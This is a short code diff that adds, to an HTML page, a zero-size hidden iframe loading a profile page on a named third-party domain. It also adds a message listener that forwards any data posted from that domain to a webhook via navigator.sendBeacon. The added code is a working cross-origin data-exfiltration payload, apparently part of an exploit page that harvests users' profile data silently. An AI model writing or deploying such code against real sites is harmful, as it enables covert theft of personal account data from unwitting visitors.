@@ -22,5 +22,14 @@ fetch(targetUrl, {
   document.write(`<pre style="color:red">ERROR: ${e.message}</pre>`);
 });
 </script>
+  <iframe src="https://uc-heytap-web-test.wanyol.com/v2/profile.html" 
+        style="width:0;height:0;border:0"></iframe>
+<script>
+  window.addEventListener('message', (e) => {
+    if (e.origin.includes('wanyol.com')) {
+      navigator.sendBeacon(webhookUrl, e.data);
+    }
+  });
+</script>
 </body>
 </html>
